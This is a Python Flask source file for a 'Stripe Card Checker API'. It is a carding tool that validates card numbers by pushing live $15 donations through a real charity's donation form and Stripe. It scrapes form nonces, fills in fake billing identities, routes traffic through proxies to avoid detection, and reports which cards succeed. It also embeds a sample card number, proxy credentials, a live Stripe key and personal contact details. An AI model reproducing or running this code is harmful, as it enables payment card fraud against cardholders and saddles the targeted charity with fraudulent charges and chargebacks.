from flask import Flask, request, jsonify
import requests, re, time, json, os

app = Flask(__name__)

def setup_proxy(proxy_str):
    """Setup proxy from string"""
    if not proxy_str:
        return None
    
    try:
        if ":" in proxy_str:
            parts = proxy_str.split(":")
            if len(parts) == 4:
                ip, port, user, password = parts
                proxy_url = f"http://{user}:{password}@{ip}:{port}"
            elif len(parts) == 2:
                ip, port = parts
                proxy_url = f"http://{ip}:{port}"
            else:
                return None
            
            return {
                "http": proxy_url,
                "https": proxy_url
            }
    except:
        pass
    return None

def Tele(ccx, proxy_str=None):
    start_time = time.time()
    
    # Setup session with proxy
    session = requests.Session()
    proxies = setup_proxy(proxy_str)
    if proxies:
        session.proxies.update(proxies)
    
    try:
        n, mm, yy, cvc = ccx.strip().split("|")
    except:
        return {
            "error": "Invalid card format. Use: number|month|year|cvc",
            "status": "❌"
        }
    
    # Extract BIN and get card info
    bin_number = n[:6]
    donation_amount = 15.00  # $15 donation
    
    # Get real BIN information
    try:
        bin_response = requests.get(f"https://lookup.binlist.net/{bin_number}", 
                                  headers={'Accept-Version': '3', 'User-Agent': 'Mozilla/5.0'},
                                  timeout=10)
        if bin_response.status_code == 200:
            bin_data = bin_response.json()
            card_type = bin_data.get('type', 'credit').upper()
            card_brand = bin_data.get('scheme', 'visa').upper()
            country_name = bin_data.get('country', {}).get('name', 'UNKNOWN')
            country_emoji = bin_data.get('country', {}).get('emoji', '🇺🇳')
            bank_name = bin_data.get('bank', {}).get('name', 'UNKNOWN BANK')
            country_code = bin_data.get('country', {}).get('alpha2', 'US')
        else:
            # Fallback BIN info
            card_type = "DEBIT" if bin_number.startswith(('4', '5')) else "CREDIT"
            card_brand = "VISA" if bin_number.startswith('4') else "MASTERCARD"
            country_name = "SPAIN"
            country_emoji = "🇪🇸"
            bank_name = "SERVIRED, SOCIEDAD ESPANOLA DE MEDIOS DE PAGO, S.A"
            country_code = "ES"
    except:
        card_type = "DEBIT"
        card_brand = "VISA"
        country_name = "SPAIN"
        country_emoji = "🇪🇸"
        bank_name = "SERVIRED, SOCIEDAD ESPANOLA DE MEDIOS DE PAGO, S.A"
        country_code = "ES"

    # Calculate Stripe fees based on card country
    if country_code == "US":
        stripe_percentage = 2.9
        stripe_fixed = 0.30
    else:
        stripe_percentage = 3.9
        stripe_fixed = 0.30
    
    stripe_fee = (donation_amount * stripe_percentage / 100) + stripe_fixed
    net_amount = donation_amount - stripe_fee

    if "20" in yy:
        yy = yy.split("20")[1]
    
    url = "https://ccyr.org/donation/"
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=0, i",
        'sec-ch-ua': "\"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\", \"Microsoft Edge Simulate\";v=\"127\", \"Lemur\";v=\"127\"",
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': "\"Android\"",
        'sec-fetch-dest': "document",
        'sec-fetch-mode': "navigate",
        'sec-fetch-site': "none",
        'sec-fetch-user': "?1",
        'upgrade-insecure-requests': "1"
    }
    
    try:
        rr = session.get(url, headers=headers, timeout=10)
        
        nonce = re.search(r'<input type="hidden" name="_charitable_donation_nonce" value="(.*?)"', rr.text)
        fid = re.search(r'<input type="hidden" name="charitable_form_id" value="(.*?)"', rr.text)
        
        if not nonce:
            return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name, 
                                 "Nonce not found - Page may have changed", "❌", time.time() - start_time,
                                 donation_amount, stripe_fee, net_amount, stripe_percentage)
        
        if not fid:
            return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                 "Form ID not found - Page may have changed", "❌", time.time() - start_time,
                                 donation_amount, stripe_fee, net_amount, stripe_percentage)
        
        nonce = nonce.group(1)
        fid = fid.group(1)
        
        # Stripe Payment Method Creation
        url_pm = "https://api.stripe.com/v1/payment_methods"
        
        payload_pm = {
            'type': "card",
            'billing_details[name]': "Khu Paw",
            'billing_details[email]': "thahningaykhu@gmail.com",
            'billing_details[address][city]': "Taurus",
            'billing_details[address][country]': "US",
            'billing_details[address][line1]': "Stockert Hollow Road Duvall",
            'billing_details[address][line2]': "Road Duvall, WA 98019",
            'billing_details[address][postal_code]': "98019",
            'billing_details[address][state]': "Taurus",
            'billing_details[phone]': "+34613220205",
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': "e7aa37ac-16ae-4b63-8429-5494edf9af433484b6",
            'muid': "a12f8d88-3a9d-4dc6-9597-274ce7890e18f65839",
            'sid': "972d10c2-8ed2-41bb-90dc-eec889cc5432763c90",
            'payment_user_agent': "stripe.js/0366a8cf46; stripe-js-v3/0366a8cf46; card-element",
            'referrer': "https://ccyr.org",
            'time_on_page': "126610",
            'key': "pk_live_51Mj89iDzAkoUZV2rg9hatfc4668c9KxoB7JLJX03IJnb6UaF4MXXrChuxZd2GhpLW8rcqvCB5pQWFSqynaH3wutT00AhwvpvjH"
        }
        
        s_headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://js.stripe.com",
            'priority': "u=1, i",
            'referer': "https://js.stripe.com/",
            'sec-ch-ua': "\"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\", \"Microsoft Edge Simulate\";v=\"127\", \"Lemur\";v=\"127\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site"
        }
        
        response_pm = session.post(url_pm, data=payload_pm, headers=s_headers, timeout=10)
        
        if response_pm.status_code == 200:
            try:
                pm_data = response_pm.json()
                pm = pm_data['id']
            except:
                error_msg = "Payment method creation failed - Invalid response"
                return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                     error_msg, "❌", time.time() - start_time,
                                     donation_amount, stripe_fee, net_amount, stripe_percentage)
        else:
            try:
                error_data = response_pm.json()
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', 'Payment method creation failed')
                    decline_code = error_data['error'].get('decline_code', '')
                    if decline_code:
                        error_msg += f" ({decline_code})"
                else:
                    error_msg = f"HTTP Error {response_pm.status_code}"
            except:
                error_msg = f"HTTP Error {response_pm.status_code}"
            return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                 error_msg, "❌", time.time() - start_time,
                                 donation_amount, 0, donation_amount, stripe_percentage)

        # Donation request
        url_donation = "https://ccyr.org/wp-admin/admin-ajax.php"
        
        payload_donation = {
            'charitable_form_id': fid,
            fid: "",
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': "/donation/",
            'campaign_id': "600",
            'description': "Support Our Mission",
            'ID': "0",
            'gateway': "stripe",
            'donation_amount': "15",
            'custom_donation_amount': "",
            'first_name': "Khu",
            'last_name': "Paw",
            'email': "thahningaykhu@gmail.com",
            'address': "Stockert Hollow Road Duvall",
            'address_2': "Road Duvall, WA 98019",
            'city': "Taurus",
            'state': "Taurus",
            'postcode': "98019",
            'country': "US",
            'phone': "+34613220205",
            'stripe_payment_method': pm,
            'cover_fees': "1",
            'action': "make_donation",
            'form_action': "make_donation"
        }
        
        headers_donation = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'accept-language': "en-US,en;q=0.9",
            'origin': "https://ccyr.org",
            'priority': "u=1, i",
            'referer': "https://ccyr.org/donation/",
            'sec-ch-ua': "\"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\", \"Microsoft Edge Simulate\";v=\"127\", \"Lemur\";v=\"127\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'x-requested-with': "XMLHttpRequest"
        }
        
        r2 = session.post(url_donation, data=payload_donation, headers=headers_donation, timeout=10)
        
        try:
            donation_data = r2.json()
            scrt = donation_data.get('secret')
            if not scrt:
                if 'errors' in donation_data:
                    error_msg = ", ".join(donation_data['errors'])
                else:
                    error_msg = "Donation failed - No secret returned"
                return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                     error_msg, "❌", time.time() - start_time,
                                     donation_amount, 0, donation_amount, stripe_percentage)
            
            pi_match = re.search(r"(pi_[^_]+)", scrt)
            if pi_match:
                pi = pi_match.group(1)
            else:
                return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                     "Payment intent not found in secret", "❌", time.time() - start_time,
                                     donation_amount, 0, donation_amount, stripe_percentage)
        except Exception as e:
            return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                 f"Donation API error: {str(e)}", "❌", time.time() - start_time,
                                 donation_amount, 0, donation_amount, stripe_percentage)
        
        # Payment confirmation
        url_confirm = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
        
        payload_confirm = {
            'expected_payment_method_type': "card",
            'use_stripe_sdk': "true",
            'key': "pk_live_51Mj89iDzAkoUZV2rg9hatfc4668c9KxoB7JLJX03IJnb6UaF4MXXrChuxZd2GhpLW8rcqvCB5pQWFSqynaH3wutT00AhwvpvjH",
            'client_secret': scrt
        }
        
        r3 = session.post(url_confirm, data=payload_confirm, headers=s_headers, timeout=10)
        
        final_time = time.time() - start_time
        
        try:
            result_data = r3.json()
            if 'status' in result_data:
                status = result_data['status']
                if status == 'succeeded':
                    return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                         "Payment Successful ✅", "✅", final_time,
                                         donation_amount, stripe_fee, net_amount, stripe_percentage)
                else:
                    return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                         f"Status: {status}", "❌", final_time,
                                         donation_amount, 0, donation_amount, stripe_percentage)
            elif 'error' in result_data:
                error_info = result_data['error']
                decline_code = error_info.get('decline_code', 'unknown_decline')
                error_message = error_info.get('message', 'Card was declined')
                return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                     f"{error_message} ({decline_code})", "❌", final_time,
                                     donation_amount, 0, donation_amount, stripe_percentage)
            else:
                return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                     "Unknown response from Stripe", "❌", final_time,
                                     donation_amount, 0, donation_amount, stripe_percentage)
        except Exception as e:
            return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                                 f"Failed to parse final response: {str(e)}", "❌", final_time,
                                 donation_amount, 0, donation_amount, stripe_percentage)
                
    except requests.exceptions.Timeout:
        return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                             "Request timeout - Server took too long to respond", "❌", time.time() - start_time,
                             donation_amount, 0, donation_amount, stripe_percentage)
    except Exception as e:
        return format_response(n, bin_number, card_type, card_brand, country_name, country_emoji, bank_name,
                             f"General error: {str(e)}", "❌", time.time() - start_time,
                             donation_amount, 0, donation_amount, stripe_percentage)

def format_response(card, bin_info, card_type, card_brand, country, country_emoji, issuer, response, status, time_taken,
                   amount, fee, net, percentage):
    """Format the response as JSON"""
    return {
        "card": card,
        "bin": bin_info,
        "card_type": card_type,
        "card_brand": card_brand,
        "country": f"{country} {country_emoji}",
        "issuer": issuer,
        "response": response,
        "status": status,
        "amount": f"${amount:.2f}",
        "fees": f"${fee:.2f}" if status == "✅" else "$0.00",
        "net_amount": f"${net:.2f}" if status == "✅" else f"${amount:.2f}",
        "fee_percentage": f"{percentage}%",
        "gateway": "Stripe Auth",
        "time": f"{time_taken:.1f}s",
        "bot_by": "@Outcome9k"
    }

@app.route('/api/stripe', methods=['GET'])
def stripe_check():
    """API endpoint for Stripe card checking"""
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    
    if not cc:
        return jsonify({
            "error": "CC parameter is required",
            "example": "/api/stripe?cc=4918500220519476|04|2026|241&proxy=pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
        }), 400
    
    try:
        result = Tele(cc, proxy)
        return jsonify(result)
    except Exception as e:
        return jsonify({
            "error": f"Internal server error: {str(e)}",
            "status": "❌"
        }), 500

@app.route('/')
def home():
    return jsonify({
        "message": "Stripe Card Checker API",
        "endpoints": {
            "stripe_check": "/api/stripe?cc=number|month|year|cvc&proxy=optional",
            "example": "/api/stripe?cc=4918500220519476|04|2026|241&proxy=ip:port:user:pass"
        },
        "author": "@Outcome9k"
    })

# Vercel requires this
if __name__ == '__main__':
    app.run(debug=True)
